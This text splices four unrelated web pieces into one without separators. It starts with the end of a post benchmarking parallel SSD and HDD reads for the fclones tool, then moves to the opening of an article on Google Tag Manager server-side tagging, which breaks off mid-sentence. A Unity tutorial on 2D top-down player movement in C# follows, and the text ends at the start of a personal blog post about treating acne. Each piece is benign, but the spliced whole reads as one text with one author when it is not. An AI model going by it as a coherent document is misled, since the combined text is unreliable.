that even 64 threads, which are far more than the number of CPU cores (4 physical, 8 virtual), still improved the performance.
I guess that with requests of such a small size to such a fast storage, you need to submit really many of them to keep 
the SSD busy.</p>

<div>
    
    
    <p><span> Fig.2: Time to hash initial blocks of ~1.2 million files on an SSD</span>
</p></div>

<p>Let’s look at <code>iostat</code>. With only 1 thread, <code>iostat</code> reports CPU to be mostly idle, but
the SSD utilization is at 100%.</p>

<pre>avg-cpu:  %user   %nice %system %iowait  %steal   %idle
           2,39    0,00    5,03    5,03    0,00   87,55

Device            r/s     rMB/s   rrqm/s  %rrqm r_await rareq-sz   aqu-sz  %util
nvme0n1       5458,00     21,32     0,00   0,00    0,11     4,00     0,00 100,00
</pre>

<p>Does it mean the SSD is already at its 100% performance? No, because 
<code>%util</code> is calculated as the ratio of <em>wall clock time</em> the device is serving requests. 
This doesn’t account for effects of submitting multiple requests at the same time.
It looks like my SSD is very happy to receive more load. With 64 threads,
<code>%util</code> is still at 100%, but the served read request rate went up by over 40 times:</p>

<pre>avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          28,46    0,00   66,92    4,62    0,00    0,00

Device            r/s     rMB/s   rrqm/s  %rrqm r_await rareq-sz   aqu-sz  %util
nvme0n1     223974,00    874,90     0,00   0,00    0,17     4,00     0,00 100,00
</pre>

<p>BTW: why the average queue size <code>aqu-sz</code> remains 0,00 even under 64 threads remain a mystery to me. 
Feel free to drop any clues in the comments.</p>

<p>How do I known the CPU is not the main bottleneck here then? The CPU load numbers given by <code>iostat</code> are pretty high, aren’t they?
I measured how much time it takes to do the task when all the data were cached, by running it again, without prior dropping caches. 
When all cached, the metadata scanning took 1.5&nbsp;s and the partial hashing took 1.7&nbsp;s. This is still
significantly faster than when physical reads were involved, so nope, 
I/O is still the major bottleneck, even with 64 threads.</p>



<p>And what about the sequential I/O reads? Does parallelizing the sequential I/O improve speed as well?
It looks like it does, although not by as much as for random I/O (Fig.&nbsp;3).
The last stage of <code>fclones</code> algorithm is hashing full files – in this experiment the files were mostly JPG and RAW images, 
about 10 MB large on average. Gains seem to hit a plateau a bit earlier – after 8 threads. In this case the operating 
system has an opportunity to prefetch data, so
it can keep the SSD busy even when my application is not asking for data for a while.</p>

<div>
    
    
    <p><span> Fig. 3: Time to hash 21.6 GB of data read from an SSD in function of number of threads</span>
</p></div>


<p>Contrary to an SSD, a spinning drive has a large seek-latency and it can serve I/O requests
at much lower rate. Hence, we can definitely expect random I/O to be much slower on an HDD than on an SSD. 
But can we expect any performance gains from reading in parallel? 
My initial thought was there shouldn’t be any visible gains, because a single HDD can only serve 
a single read request at a given time, then it has to reposition the heads to “jump” to another file, and 
this looks very “sequentially” in principle. Having a large number of requests piled up in the queue 
shouldn’t change anything: the HDD would handle them in a sequence anyways. 
An HDD is also slow enough that even a single fast thread should keep it fully busy with at 
least one request ready to serve at any time.</p>

<p>I was wrong. It turns out that for small, random I/O requests there are noticeable gains from parallelism 
even on an HDD (Fig. 4). But this happens for a different reason than on SSD. 
The seek latency depends heavily on the <em>order</em> of the I/O requests. If the process submits more
I/O requests from multiple threads, the operating system can <em>reorder</em> them by physical data location, thus minimizing
the distance the HDD heads have to travel.</p>

<div>
    
    
    <p><span> Fig.4: Time to hash initial blocks of 46,165 files on a 7200 RPM HDD</span>
</p></div>


<p>Unfortunately, when reading larger chunks of data sequentially, using multi-threding actually hurts the throughput (Fig.&nbsp;5).
This is because the operating system interleaves the I/O requests coming from different threads and the HDD would have
to reposition the heads frequently jumping from one file to another. How much throughput is lost depends heavily on the operating
system and its configuration, but generally I’d expect this to be a factor 2x-10x.</p>

<div>
    
    
    <p><span> Fig.5: Time to hash 1.7 GB of data on a 7200 RPM HDD</span>
</p></div>

<p>One way of solving this problem in an application is to not allow many threads to contend for the same HDD device at the OS level, and 
instead make the application take some control over the I/O request scheduling by itself.
You can use a dedicated single thread to handle all I/O to a single spinning drive (this is what <code>fclones</code> does since version 0.7.0),
or guard I/O operations by a critical section (mutex) associated with each HDD and locked at a granularity coarse enough that
seek time doesn’t matter. I don’t recommend making the whole application single-threaded, because that would disallow
issuing parallel requests to multiple devices and it wouldn’t allow the gains outlined above.</p>

<p>Additionally, many operating systems allow to tell the kernel that the application will be reading the file data sequentially. 
For example in Linux, after opening the file, just call <a href="https://man7.org/linux/man-pages/man2/posix_fadvise.2.html"><code>posix_fadvise</code></a> with <code>POSIX_FADV_SEQUENTIAL</code>:</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>fs</span><span>::</span><span>*</span><span>;</span>
<span>use</span> <span>nix</span><span>::</span><span>fcntl</span><span>::</span><span>*</span><span>;</span>
<span>let</span> <span>file</span> <span>=</span> <span>File</span><span>::</span><span>open</span><span>(</span><span>"foo.txt"</span><span>)</span><span>?</span><span>;</span>
<span>let</span> <span>errno</span> <span>=</span> <span>posix_fadvise</span><span>(</span><span>file</span><span>.as_raw_fd</span><span>(),</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>PosixFadviseAdvice</span><span>::</span><span>POSIX_FADV_SEQUENTIAL</span><span>)</span><span>?</span><span>;</span>
</code></pre></div></div>

<p>Internally this option increases the size of the read-ahead buffer, so the system can fetch data in larger chunks, 
potentially reducing the number of seeks. The effects of this flag are clearly visible and it improves performance of parallel access, 
but it is not strong enough to reduce the seek overhead to zero. Interestingly, I haven’t observed any effects 
of this flag on single-threaded throughput in my test, but YMMV.</p>


<ul>
  <li>Random I/O and reading metadata benefits from parallelism on both types of drives: SSD and HDD</li>
  <li>SSDs generally benefit from parallelism much more than HDDs</li>
  <li>Parallel access to HDD when reading large chunks of data sequentially can deteriorate performance</li>
  <li>Calling <code>posix_fadvise</code> to inform the system about sequential access pattern improves read throughput slightly
when sharing the device between multiple threads on Linux</li>
</ul>

<div>
<p>Ever since <strong>Server-side tagging</strong> was <a href="https://twitter.com/SimoAhava/status/1222459714614841346?s=20">publicly announced</a> at <a href="https://superweek.hu/">SUPERWEEK 2020</a>, Google and the trusted tester community have been hard at work, building something that just might change the landscape of digital analytics for good.</p>
<p><a href="https://tagmanager.google.com/">Google Tag Manager</a> has now released Server-side tagging into <strong>public beta</strong>. In this lengthy article, we’ll take a look at what Server-side tagging is, how it should (and should not) be used, and what its implications are on the broader digital analytics community.</p>
<p><a href="https://www.simoahava.com/images/2020/07/server-side-tagging-google-tag-manager.jpg" title="Server-side tagging">

</a>
</p>
<p>In short, <strong>Server-side tagging</strong> means running a <strong>Google Tag Manager container</strong> in a server-side environment (at the time of writing, the only available environment is the <a href="https://cloud.google.com/">Google Cloud Platform</a>, though I’m certain more options will become available in good time).</p>
<p>Many of the <a href="#key-benefits">benefits</a> and <a href="#key-concerns">concerns</a> are tackled in their respective chapters. Even so, I want to emphasize that Server-side tagging has the potential to overturn the current dynamic of data collection and governance for an organization. You <a href="#full-control-and-ownership-of-the-data-collected-by-the-container"><strong>own</strong> and have <strong>full control</strong></a> over the server-side environment. You have access to <strong>tools</strong> and <strong>methods</strong> to thoroughly <a href="#clean-up-and-validate-payloads">vet and validate the traffic</a> between network sources and your advertising and analytics endpoints.</p>
<p>You can run a fully functional digital analytics and marketing setup without loading <em>any</em> third-party code in the user’s browser or device. With appropriate monitoring in place, you can say <a href="#more-control-over-http-traffic">goodbye to PII and credential leaks</a>, cross-site tracking traps, and bloated third-party JavaScript <a href="#reduced-client-load">encumbering the client</a>.</p>
<p>Server-side tagging utilizes many of the concepts familiar to Google Tag Manager users:</p>
<ul>
<li>
<p>There are <strong>tags</strong> which fire on <strong>triggers</strong> and pull in data from <strong>variables</strong>.</p>
</li>
<li>
<p>New container <strong>versions</strong> can be <strong>previewed</strong> and <strong>published</strong>.</p>
</li>
<li>
<p>Users can create their own <a href="https://www.simoahava.com/analytics/custom-templates-guide-for-google-tag-manager/"><strong>custom templates</strong></a>.</p>
</li>
</ul>
<p>However, there are new, fundamentally different features that introduce something of a <strong>paradigm shift</strong> to the type of dynamic tagging that Google Tag Manager promotes.</p>
<ul>
<li>
<p>The container itself is a new <a href="#server-container"><strong>Server</strong></a> type; different from the web, app, and AMP containers that precede it.</p>
</li>
<li>
<p>Instead of trigger events, processes are initialized by <strong>incoming HTTP requests</strong>.</p>
</li>
<li>
<p>These requests are digested by a new type of GTM entity: <strong>a <a href="#clients-and-tags">Client</a></strong>.</p>
</li>
<li>
<p>The Client parses the requests, generates an <strong>event data object</strong>, and feeds this into a <strong>virtual container</strong>, where tags can use this event object to map and send data to their endpoints.</p>
</li>
</ul>

<p>This article <strong>will not be</strong> an exhaustive guide. I will walk you through the main concepts of Server-side tagging and there should be little you’ll be left wanting, but to complement this article, I do recommend you consult Google’s <a href="https://developers.google.com/tag-manager/serverside">own, official documentation</a>.</p>

<p>The first one is a general introduction to <strong>Server-side tagging</strong>, focusing on deployment and getting started with your first Client and tag.</p>
<p>The second is a deep-dive into building your own Client template. It’s a bit more specialized and can thus be skipped if you’re not interested in customizing the container.</p>

<p><a href="https://www.simoahava.com/images/2020/07/server-side-tagging-outline.jpg" title="Server-side tagging outline">
<img data-src="https://www.simoahava.com/images/2020/07/server-side-tagging-outline.jpg#ZgotmplZ" alt="Server-side tagging outline" src="https://www.simoahava.com/images/2020/07/server-side-tagging-outline.jpg#ZgotmplZ">
</a>
</p>
<p>With Server-side tagging, Google Tag Manager has introduced a new <strong>Server</strong> container type, which resides in a <a href="https://cloud.google.com/">Google Cloud</a> environment.</p>
<p>In a nutshell, the purpose of this setup is to create an endpoint in a server environment that <strong>you own</strong>. It will act as a sort of a <strong>proxy</strong> between the hits sent from browsers and devices and the actual endpoints to which the hits are collected. See the <a href="#key-benefits">next chapter</a> for more details on what this type of proxy can do.</p>
<p>The container itself operates as an HTTP API endpoint, to which any browser, device, or other sources that support the HTTP protocol can send requests.</p>
<p>Ideally, this endpoint would be mapped with a <strong>custom subdomain</strong> in the same domain hierarchy as the website sending the requests. That way the requests are considered to happen in <a href="https://www.cookiestatus.com/introduction/tracking-protection/#first-party-and-third-party-context">first-party context</a>, which has a significant impact on how cookies can be read and written, for example.</p>
<p>Within the Server container, workers known as <strong>Clients</strong> are configured to listen for these incoming HTTP requests, which they then parse into a <strong>unified event format</strong>. The Clients then run a <em>virtual container</em> with the <a href="#event-model">event data object</a>, where tags, triggers, and variables react to the event push similar to how they would with “regular” Google Tag Manager.</p>
<p>Tags take the information in these event data objects and compile them into HTTP requests to their respective endpoints. Finally, the Client sends an HTTP response back to the source of the initial request.</p>
<p><a href="https://www.simoahava.com/images/2020/07/ua-response.jpg" title="Example of a Universal Analytics client responding with a success status and setting the _ga cookie in the response.">
<img data-src="https://www.simoahava.com/images/2020/07/ua-response.jpg#ZgotmplZ" alt="Example of a Universal Analytics client responding with a success status and setting the _ga cookie in the response." src="https://www.simoahava.com/images/2020/07/ua-response.jpg#ZgotmplZ">
</a>
<span>Example of a Universal Analytics client responding with a success status and setting the _ga cookie in the response.</span>
</p>
<p>All of the above happens within the confines of the Server-side tagging environment. The only way the browser or app sending the data can be made aware of what’s going on is if the <strong>Client</strong> adds information into the HTTP response, which is fully configurable.</p>
<h2 id="key-benefits">Key benefits</h2>
<p>Here are some of the key benefits of using Server-side tagging.</p>
<h3 id="reduced-client-load">Reduced client load</h3>
<p>By running the logic of building and dispatching hits to the vendor endpoint in your server-side environment, you have a golden opportunity to reduce the amount of (especially third-party) JavaScript run in the user’s browser.</p>
<p>Because you can configure the Server container to map <em>any</em> incoming HTTP request into the format required by the vendor, you can theoretically reduce your entire third-party pixel and JavaScript load to a single event stream directed into your Server container.</p>
<p><a href="https://www.simoahava.com/images/2020/07/all-javascript.jpg" title="Imagine if you could reduce the amount of JavaScript loaded and executed in the browser...">
<img data-src="https://www.simoahava.com/images/2020/07/all-javascript.jpg#ZgotmplZ" alt="Imagine if you could reduce the amount of JavaScript loaded and executed in the browser..." src="https://www.simoahava.com/images/2020/07/all-javascript.jpg#ZgotmplZ">
</a>
<span>Imagine if you could reduce the amount of JavaScript loaded and executed in the browser...</span>
</p>
<p>This stream can then be intercepted by a Client which proceeds to map the stream into the <a href="#event-model">event model</a> expected by the vendor tags, also running in the Server container.</p>
<p>This is the <strong>ultimate benefit</strong> of a Server-side tagging setup. Even if you don’t want to reduce everything to a single stream, you can build your own <a href="https://www.simoahava.com/analytics/custom-templates-guide-for-google-tag-manager/">custom template</a> in the web container, which builds the HTTP request to the Server container without having to load any third-party JavaScript at all (apart from the GTM library itself).</p>

<h3 id="keep-keys-and-secrets-safe">Keep keys and secrets safe</h3>
<p>By transporting data processing logic away from the device, where it would be visible for anyone with debugging skills, you will also be able to run secured and credential-based transactions without having to worry about exposing sensitive information to the device.</p>
<p>For example, a plague on Google Analytics has been <a href="https://help.analyticsedge.com/article/definitive-guide-to-removing-google-analytics-spam/">Measurement Protocol spam</a>, where malicious parties crawl potential tracking IDs and then proceed to spam them with automated HTTP requests that masquerade as “regular” hits from the site. Alternatively, these hackers send spam hits to <strong>random tracking IDs</strong>, knowing that if they send enough hits, some of them will end up in real Universal Analytics accounts.</p>
<p>This type of spam is notoriously difficult to identify and prevent because it’s built to resemble actual hits that are sent from the website itself.</p>
<p>Now that you have the server endpoint handy, you can add a new <strong>Custom Dimension</strong> within the Server container, which is then sent to Google Analytics. In Google Analytics, you can then create a filter for this Custom Dimension, allowing only traffic that matches it.</p>
<div><pre><code data-lang="javascript">event[<span>'x-ga-mp1-cd11'</span>] = <span>'my_secret_key'</span>;
</code></pre></div>
<p><a href="https://www.simoahava.com/images/2020/07/custom-dimension-set.jpg" title="Secret key custom dimension">
<img data-src="https://www.simoahava.com/images/2020/07/custom-dimension-set.jpg#ZgotmplZ" alt="Secret key custom dimension" src="https://www.simoahava.com/images/2020/07/custom-dimension-set.jpg#ZgotmplZ">
</a>
</p>
<p>By adding this “secret key” in the Server container, there’s no way that a random Measurement Protocol spammer can know it’s there. Similarly, it won’t help if the spammer crawls your site, looking at the requests sent to Google Analytics, because there are no such requests! There are only requests to your own server-side endpoint, and it would be odd if Measurement Protocol spammers would utilize those to fuel their spam algorithms.</p>
<p>Naturally, this isn’t limited to just what you can do with Universal Analytics. Any third-party servers that identify your access with an <strong>API key</strong> or <strong>credential token</strong> can now be proxied through your Server container so that these keys are not exposed in the device!</p>
<h3 id="more-control-over-what-endpoints-collect">More control over what endpoints collect</h3>
<p>Because your proxy now resides between the user’s device and the endpoint, you are in full control over what is shipped to the vendor.</p>
<p>Unless the Client <a href="https://developers.google.com/tag-manager/serverside/api#getremoteaddress">specifically overrides</a> things like the IP address and User-Agent in the outgoing HTTP request from the Server container (this is what the built-in Universal …</p></div></div></div>

<p>Doing 2D top down movement in Unity for your player can easily be achieved with some basic Unity functions and a small script. </p>



<p>First we just going to setup our project. If you don’t want to follow along on this page you can watch the video version below:</p>



<iframe loading="lazy" width="560" height="315" src="about:blank" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" data-rocket-lazyload="fitvidscompatible" data-lazy-src="https://www.youtube.com/embed/IP30ys3CN2g"></iframe>



<h3>Setting up our top down game scene</h3>



<p>On the left hand side in the Unity hierarchy right click and create a empty game object. In the inspector add a sprite renderer component.</p>



<p>Copy the following inspector settings, the most import settings is the position and the order in layer must be -100 so the background renders at the back of all your assets in your game scene.</p>



<figure><img loading="lazy" width="388" height="429" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png" alt="unity 2d move up and down" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png 388w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-271x300.png 271w" sizes="(max-width: 388px) 100vw, 388px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20388%20429'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png 388w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-271x300.png 271w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png"></figure>



<p>Add in your background image into the sprite slot and you are ready to go. You now have a nice background in my case I have something that looks like this.</p>



<figure><img loading="lazy" width="733" height="725" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg" alt="Background image in our scene in the top down" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg 733w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-300x297.jpg 300w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-640x633.jpg 640w" sizes="(max-width: 733px) 100vw, 733px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20733%20725'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg 733w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-300x297.jpg 300w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-640x633.jpg 640w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg"></figure>



<h3>Adding our player to our scene: unity top down movement</h3>



<p>Right click in the hierarchy again and create a new game object, rename it and call it Player. </p>



<p>In the inspector add a Rigidbody 2D.  Copy the details below:</p>



<figure><img loading="lazy" width="390" height="454" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png" alt="Player movement settings inspector" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png 390w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2-258x300.png 258w" sizes="(max-width: 390px) 100vw, 390px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20390%20454'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png 390w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2-258x300.png 258w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png"></figure>



<p>You should now have your player in the scene and should look something like this now.</p>



<figure><img loading="lazy" width="608" height="648" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg" alt="Unity 2D movement top down without our player added" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg 608w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3-281x300.jpg 281w" sizes="(max-width: 608px) 100vw, 608px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20608%20648'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg 608w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3-281x300.jpg 281w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg"><figcaption>Unity 2D movement top down</figcaption></figure>



<h3>Write our code for our Unity 2D top down player movement controller</h3>



<p>First off click on your player game object. Add a new component in the inspector called Player Movement. </p>



<p>Like below this is going to be our 2d character controller :</p>



<figure><img loading="lazy" width="275" height="257" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-4.png" alt="movement code 2d unity" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20275%20257'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-4.png"></figure>



<p>Now open up your new c# script in visual studio. </p>



<p>We need to now define a few things, we first of all want to control our player movement speed so we will need a player movement variable. </p>



<p>Next we need a target position variable which will be the position we want our player to move towards. </p>



<p>We now need to use some of the built in Unity functions like the Vector2.MoveTowards method. Also we will use time.deltaTime to make sure our movement is frame rate independent. </p>



<p>We will also use ScreenToWorldPoint to convert our mouse position on screen to a point in our world. </p>



<p>We will use the Input class to get the position of our mouse clicks.</p>



<p>Lets get into the code.</p>



<pre><code lang="csharp">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class PlayerMovement : MonoBehaviour
{
    // Start is called before the first frame update
   
    public float speed;
    private Vector2 targetPosition;
    void Start()
    {
        
        targetPosition = new Vector2(0.0f, 0.0f);
    }

    // Update is called once per frame
    void Update()
    {
        if (Input.GetMouseButtonDown(0))
        {
            targetPosition = Input.mousePosition;
            targetPosition = Camera.main.ScreenToWorldPoint(new Vector3(targetPosition.x, targetPosition.y, 0.0f));
        }
        this.transform.position = Vector2.MoveTowards(this.transform.position, targetPosition, speed * Time.deltaTime);
           
       
    }
}
</code></pre>



<p>Just a quick explanation on how this code works. In the start method we just set a start position to 0.0f and 0.0f just to start with a default position. </p>



<p>Our player initially will also be at 0,0 in our scene so when our game starts our player won’t jump or move. </p>



<p>Next in the update method we need to get our mouse input. So we call Input.GetMouseButtonDown(0) the zero is for the left click on our mouse.  We then set our targetPosition to our mousePosition. </p>



<p>We then take those co ordinates to worldPoints the ScreenToWolrdPoint method needs a Vector3 in our case we just pass the x and y position because we are only moving in 2D space. </p>



<p>Then finally we set the transform position of our player by calling Vector2.MoveTowards with the player current position and target position. </p>



<p>We plugin our speed and multiply it by Time.deltaTime to make our movement frame rate independent.</p>



<h3>Setting our player movement speed</h3>



<p>Once you have saved the script. Close visual studio and now we just need to give our player a movement speed.</p>



<figure><img loading="lazy" width="397" height="158" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png" alt="unity top down movement rotation" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png 397w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5-300x119.png 300w" sizes="(max-width: 397px) 100vw, 397px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20397%20158'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png 397w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5-300x119.png 300w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png"></figure>



<p>I just chose a speed of 10 which is a decent smooth speed for our player to move. </p>



<p>Well done if you have done everything correctly you should now have your first Unity 2D top down player movement working. </p>



<p>What’s great about this very basic movement script is that it can be used for so many types of games. </p>



<p>Adventure games, rpg style games, if you wanted to stick to complete rpg style you would just have to make sure your Vector in your MoveTowards is locked to one axis at a time because your player can only move up or down and left or right not diagonally.</p>



<h3>Weird issues you might have</h3>



<p>You might have run into some issues. Where your player might be falling off the screen when you hit play. </p>



<p>In order to make your unity 2d top down&nbsp;gravity work properly you need to set your gravity scale to 0 in your Rigidbody 2D component. Like so:</p>



<figure><img loading="lazy" width="376" height="141" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png" alt="unity 2d top down gravity" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png 376w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6-300x113.png 300w" sizes="(max-width: 376px) 100vw, 376px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20376%20141'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png 376w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6-300x113.png 300w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png"><figcaption> unity 2d top down&nbsp;gravity </figcaption></figure>

<p>So I hope you liked this short tutorial on unity movement and how you can move a player easily in unity using a c# script. There are a lot of ways in which you can create player movement and more.</p>



<p>Some of which is using animation transitions. You could also use a physics based approach propelling your player on screen as well. It’s really up to your creativity. However hopefully this will get you off to a good start.</p>

<p>Click <a href="#acne-method">here</a> to skip to my acne solution section if you’d like. Read on if you’d like the whole story!</p>



<p>Hey there, I’m Conor. I’m a software engineer, I like to make indie music, and I’m an alumnus of suffering from some pretty bad acne.</p>



<p>Living with acne has been a humbling test of confidence. Talking about it this openly on the internet is something I don’t find easy, even though I no longer really have any acne. I’d like to share my success story in hopes of inspiring you guys to solve your acne with a new mindset.</p>



<h2>Here’s what I used to look like</h2>







<p>So, here I am on April 25, 2017. I’m 21 years old and a junior in University of Pittsburgh. My face hurts me, both mentally and physically. I had intense cystic acne that was deep enough to continue causing new pimples. Some days, I would leave class early because I felt gross and my face hurt.</p>



<h2>Bad Acne Can Be Hard To Get Rid Of</h2>



<div><figure><img loading="lazy" width="580" height="447" src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=580%2C447&amp;ssl=1" alt="" srcset="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1024%2C789&amp;ssl=1 1024w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=300%2C231&amp;ssl=1 300w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=768%2C592&amp;ssl=1 768w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1536%2C1184&amp;ssl=1 1536w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1200%2C925&amp;ssl=1 1200w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?w=1650&amp;ssl=1 1650w" sizes="(max-width: 580px) 100vw, 580px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1024%2C789&amp;ssl=1 1024w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=300%2C231&amp;ssl=1 300w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=768%2C592&amp;ssl=1 768w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1536%2C1184&amp;ssl=1 1536w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1200%2C925&amp;ssl=1 1200w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?w=1650&amp;ssl=1 1650w" data-lazy-src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=580%2C447&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Tons and Tons of different acne medications</figcaption></figure></div>



<p>I was looking for anything that would solve my acne. I was constantly trying new regimens and routines: regimens I’d found online, advice from my dermatologist, regimens that I’d concocted out of thin air, etc. There are an enormous amount of resources/communities online where I ‘d sourced these ideas from acne.org, <a href="https://www.reddit.com/r/skincareaddiction">reddit.com/r/skincareaddiction</a>, bloggers/youtube. While these communities were great for inspiration, they also created an information overload.</p>



<p>Each community would have their own regimens to try, some of which would contradict one another, some regimens were straight up paid celebrity/blogger propaganda, some regimens were just placebos. Forums could be filled with people saying, “This product is a miracle cure!”, while others said the product had flared up their acne. It was tough to find scientific, unbiased reviews of regimens to try on my own skin.</p>



<p>To compound this, trying a new routine on skin is a frustratingly slow process. Unfortunately, overnight cures don’t yet exist for acne. Changes in skin from a new regimen can take days or weeks to be seen and sometimes the skin will get worse before it gets better. There are also external forces working on your skin, like stress in school or work, sweating from working out, and climate (like warmer weather). <strong>I needed to experiment with my own skin and environment to accurately understand what was causing my acne.</strong></p>



<h2>Solving My Acne Scientifically</h2>

<p>It’s an understatement to say that tackling my acne seemed like a daunting challenge. It felt hopeless some days. I would try different regimens, my acne would flare, and I’d have no clue as to why. So I’d switch to a different regimen after a few days and still have no luck. Eventually I would return, cyclically to the same non-working regimens and never get anywhere.</p>



<p>I was still in college at this time, studying mainly Computer Science. I really dug my CS degree. Everyone has seen all the wild stuff that comes out of CS like machine learning and what not, but I think CS gave me something something else: a process for solving complex problems.</p>



<p>In the abstract, students of Computer Science are taught logical ways of problem solving. We are taught multiple sets of <a href="https://medium.com/@codingfreak/top-algorithms-data-structures-concepts-every-computer-science-student-should-know-e0549c67b4ac">rules</a> which we will use for transforming raw data inputs into our ideal and repeatable data outputs. What started as completely impossible problems (i.e <a href="https://www.geeksforgeeks.org/reverse-a-linked-list/">reversed linked list problems</a>) became trivial with these processes of algorithmic thinking. <a href="#note-1">[1]</a></p>



<h3 id="acne-method">My Acne Management Method</h3>



<p><em>Side Note: See the below section: <a href="#making-method-easier">Making The Method Easier</a> for a better experience.</em></p>



